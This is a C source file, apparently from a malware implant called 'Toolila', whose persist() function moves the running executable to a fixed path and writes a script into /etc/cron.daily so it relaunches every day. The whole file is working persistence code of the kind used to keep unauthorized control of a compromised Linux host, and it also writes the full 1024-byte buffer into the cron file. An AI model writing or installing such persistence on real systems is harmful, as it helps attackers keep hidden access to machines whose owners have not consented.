#include "persistence.h"
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <unistd.h>

void persist()
{
    int crontab_fd;
    char toolila_current_path[255] = {};
    char crontab_rule[1024] = {};
    if (readlink("/proc/self/exe", toolila_current_path, sizeof(toolila_current_path)) < 0)
    {
        perror("Failed to read link of self.");
        exit(EXIT_FAILURE);
    }
    printf("Toolila is at %s\n", toolila_current_path);
    printf("Moving Toolila to %s\n", TOOLILA_PERSISTENCE_PATH);

    if (rename(toolila_current_path, TOOLILA_PERSISTENCE_PATH) < 0)
    {
        perror("Failed to move Toolila.");
        exit(EXIT_FAILURE);
    }

    if ((crontab_fd = open("/etc/cron.daily/leela", O_CREAT | O_WRONLY, S_IRWXU | S_IRGRP | S_IXGRP | S_IXOTH | S_IROTH)) < 0)
    {
        perror("Failed to open crontab.");
        exit(EXIT_FAILURE);
    }
    sprintf(crontab_rule, "#!/bin/sh\n%s\n", TOOLILA_PERSISTENCE_PATH);
    printf("Adding the crontab rule\n%s", crontab_rule);
    write(crontab_fd, crontab_rule, sizeof(crontab_rule));
    close(crontab_fd);
}